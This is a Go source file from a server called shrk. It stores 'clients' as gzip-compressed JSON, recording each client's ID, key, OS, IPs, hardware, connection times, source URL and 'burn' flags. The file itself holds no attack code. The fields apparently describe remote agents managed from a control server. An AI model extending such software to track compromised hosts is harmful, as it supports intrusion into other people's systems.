package database

import (
	"compress/gzip"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path"
	"time"

	"github.com/ngn13/shrk/server/config"
	"github.com/ngn13/shrk/server/log"
	"github.com/ngn13/shrk/server/util"
)

type Type struct {
	Conf    *config.Type `json:"-"`       // server config
	Path    string       `json:"-"`       // path for the database
	Tokens  []string     `json:"-"`       // token list
	Clients []Client     `json:"clients"` // client list
}

func New(conf *config.Type) (*Type, error) {
	var (
		data Type
		err  error
	)

	if err = util.DirExists(conf.Database); err != nil && !os.IsNotExist(err) {
		return nil, fmt.Errorf("cannot access database directory: %s", err.Error())
	}

	if err = os.Mkdir(conf.Database, os.ModePerm); err != nil && !os.IsExist(err) {
		return nil, fmt.Errorf("cannot create the database directory: %s", err.Error())
	}

	data.Path = path.Join(conf.Database, "data")
	data.Conf = conf
	data.Tokens = []string{}
	data.Clients = []Client{}

	if conf.Debug {
		data.ClientAdd(CLIENT_DEBUG_ID, CLIENT_DEBUG_KEY)
	}

	return &data, data.Load()
}

func (d *Type) Load() error {
	var (
		df  *os.File
		gz  io.Reader
		err error
	)

	// dont load anything in debug mode
	if d.Conf.Debug {
		return nil
	}

	if df, err = os.Open(d.Path); err != nil && !os.IsNotExist(err) {
		log.Debg("failed to open the database file for loading: %s", err.Error())
		return err
	}

	if os.IsNotExist(err) {
		return nil
	}

	defer df.Close()

	if gz, err = gzip.NewReader(df); err != nil {
		log.Debg("failed to open the gzip reader for loading: %s", err.Error())
		return err
	}

	dec := json.NewDecoder(gz)

	if err = dec.Decode(d); err != nil {
		log.Debg("failed to decode the data from JSON for loading: %s", err.Error())
		return err
	}

	return nil
}

func (d *Type) Save() error {
	// dont save anything in debug mode
	if d.Conf.Debug {
		return nil
	}

	var (
		df  *os.File
		err error
	)

	if df, err = os.OpenFile(d.Path, os.O_RDWR|os.O_CREATE, 0600); err != nil {
		log.Debg("failed to open the database file for saving: %s", err.Error())
		return err
	}

	defer df.Close()

	gz := gzip.NewWriter(df)
	enc := json.NewEncoder(gz)

	defer gz.Close()

	if err = enc.Encode(d); err != nil {
		log.Debg("failed to encode the data as JSON for saving: %s", err.Error())
		return err
	}

	return nil
}

func (d *Type) ClientAdd(id string, key string) (*Client, error) {
	if id == "" {
		id = util.RandomStr(CLIENT_ID_SIZE)
	}

	if key == "" {
		key = util.RandomStr(CLIENT_KEY_SIZE)
	}

	if _, i := d.ClientGet(id); i >= 0 {
		return nil, fmt.Errorf("client with the same id exists")
	}

	var client Client = Client{
		ID:         id,
		Key:        key,
		OS:         "",
		IPs:        []string{},
		Memory:     0,
		Cores:      0,
		FirstCon:   time.Time{},
		LastCon:    time.Time{},
		HasInfo:    false,
		Connected:  false,
		SourceURL:  "",
		ShouldBurn: false,
		IsBurned:   false,
	}

	d.Clients = append(d.Clients, client)
	return &d.Clients[len(d.Clients)-1], d.Save()
}

func (d *Type) ClientGet(id string) (*Client, int) {
	for i := range d.Clients {
		if d.Clients[i].ID == id {
			return &d.Clients[i], i
		}
	}
	return nil, -1
}

func (d *Type) ClientDel(id string) error {
	var indx int

	if _, indx = d.ClientGet(id); indx < 0 {
		return nil
	}

	d.Clients = append(d.Clients[:indx], d.Clients[indx+1:]...)
	return d.Save()
}
